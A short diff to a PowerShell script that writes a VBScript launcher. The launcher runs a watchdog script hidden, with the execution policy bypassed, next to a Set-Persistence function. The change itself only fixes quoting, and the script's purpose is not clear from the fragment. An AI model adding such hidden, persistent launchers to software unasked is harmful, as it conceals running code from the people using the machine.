@@ -157,7 +157,11 @@ while (`$true) {
 }
 
 function Write-VbsLauncher {
-    Set-Content -Path $watchdogVbs -Value "Set objShell = CreateObject(`"WScript.Shell`")`nobjShell.Run `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$watchdogPs1`"`"`, 0, False" -Force
+    $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & "$watchdogPs1" & Chr(34), 0, False
+"@
+    Set-Content -Path $watchdogVbs -Value $vbsContent -Force
 }
 
 function Set-Persistence {
